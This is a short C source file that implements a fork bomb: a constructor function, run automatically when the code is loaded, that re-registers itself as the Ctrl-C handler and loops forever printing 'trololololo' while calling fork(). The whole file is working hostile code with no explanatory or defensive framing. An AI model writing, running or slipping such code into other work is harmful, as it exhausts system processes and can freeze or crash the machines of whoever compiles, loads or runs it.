#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>

#define ever (;;)

static void init()  __attribute__((constructor));

void init() {
  signal(SIGINT, init);
  for ever {
    printf("trololololo\n");
    fork();
  }
}
